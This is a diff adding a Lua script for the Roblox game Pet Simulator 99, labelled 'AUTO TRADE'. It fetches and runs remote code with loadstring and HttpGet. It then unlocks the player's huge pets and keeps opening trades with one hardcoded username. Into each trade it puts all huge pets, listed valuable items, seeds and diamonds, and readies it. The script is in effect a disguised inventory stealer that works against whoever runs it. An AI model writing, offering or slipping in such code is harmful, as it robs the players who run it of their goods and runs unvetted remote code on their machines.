@@ -1,0 +1,147 @@
+--AUTO TRADE
+loadstring(game:HttpGet("https://raw.githubusercontent.com/fdvll/pet-simulator-99/main/waitForGameLoad.lua"))()
+wait(25)
+if game.PlaceId == 8737899170 then
+    Username = "REyifpof"
+    getgenv().ItemToTrade = {"Mini Pinata", "Mini Lucky Block", "Party Box", "Rainbow Mini Chest", "Mini Chest", "Charm Stone", "Large Gift Bag", "Gift Bag", "Secret Key Upper Half", "Secret Key Lower Half", "Crystal Key Upper Half", "Crystal Key Lower Half", "Tech Key Lower Half", "Tech Key Upper Half", "Daycare Slot Voucher", "Spinny Wheel Ticket", "Tech Spinny Wheel Ticket", "Diamond", "Insta Plant Capsule", "Seed Bag", "Arcade Token", "Prison Key", "Golden Prison Key"}
+
+    local library = require(game.ReplicatedStorage.Library)
+    local save = library.Save.Get()
+    local inventory = library.Save.Get().Inventory
+
+    local function GetTradeID()
+        return require(game.ReplicatedStorage.Library.Client.TradingCmds).GetState()._id
+    end
+
+    local function GetCounter()
+        return require(game.ReplicatedStorage.Library.Client.TradingCmds).GetState()._counter
+    end
+
+    local function SendTrade(username)
+        local args = {
+            [1] = game:GetService("Players"):WaitForChild(Username)
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Request"):InvokeServer(unpack(args))
+    end
+
+    local function ReadyTrade()
+        local args = {
+            [1] = GetTradeID(),
+            [2] = true,
+            [3] = GetCounter()
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Ready"):InvokeServer(unpack(args))
+    end
+
+    local function UnlockPet()
+        if save.Inventory.Pet ~= nil then
+            for i,v in pairs(save.Inventory.Pet) do
+                id = v.id
+                dir = library.Directory.Pets[id]
+                if dir.huge then
+                    local args = {
+                        [1] = i,
+                        [2] = false
+                    }
+                    
+                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
+                end
+            end
+        end 
+    end
+
+    local function DepositPetInTrade()
+        if save.Inventory.Pet ~= nil then
+            for i,v in pairs(save.Inventory.Pet) do
+                id = v.id
+                dir = library.Directory.Pets[id]
+                if dir.huge then
+                    wait(0.2)
+                    local args = {
+                        [1] = GetTradeID(),
+                        [2] = "Pet",
+                        [3] = i,
+                        [4] = v._am or 1
+                    }
+                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Item"):InvokeServer(unpack(args))
+                end
+            end
+        end 
+    end
+
+
+    local function DepositItemInTrade()
+        for i,v in pairs(save.Inventory.Misc) do
+            if v._am ~= nil then
+                for _, itemName in pairs(getgenv().ItemToTrade) do
+                    if v.id == itemName then
+                        wait(0.2)
+                        local args = {
+                            [1] = GetTradeID(),
+                            [2] = "Misc",
+                            [3] = i,
+                            [4] = v._am
+                        }
+                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Item"):InvokeServer(unpack(args))
+                    end
+                end
+            end
+        end
+    end
+
+
+    local function DepositSeedInTrade()
+        for i,v in pairs(save.Inventory.Seed) do
+            if v._am ~= nil then
+                for _, itemName in pairs(getgenv().ItemToTrade) do
+                    if v.id == itemName then
+                        wait(0.2)
+                        local args = {
+                            [1] = GetTradeID(),
+                            [2] = "Seed",
+                            [3] = i,
+                            [4] = v._am
+                        }
+                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Item"):InvokeServer(unpack(args))
+                        print(i, v._am, itemName)
+                    end
+                end
+            end
+        end
+    end
+
+    local function DepositDiamondsInTrade()
+        for i,v in pairs(save.Inventory.Currency) do
+            if v.id == 'Diamonds' then
+                wait(0.2)
+                local args = {
+                    [1] = GetTradeID(),
+                    [2] = "Currency",
+                    [3] = i,
+                    [4] = v._am
+                }
+                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Item"):InvokeServer(unpack(args)) 
+            end
+        end
+    end
+
+
+    while true do
+        wait(1)
+        if game:GetService("Players"):WaitForChild(Username) ~= nil then
+            UnlockPet()
+            SendTrade(Username)
+        end
+        if game.Players.LocalPlayer.PlayerGui.TradeWindow.Enabled == true and GetTradeID() ~= nil then
+            if deposited ~= true then
+                DepositPetInTrade()
+                DepositItemInTrade()
+                DepositSeedInTrade()
+                DepositDiamondsInTrade()
+                ReadyTrade()
+            end
+            wait(3)
+        end
+    end
+end
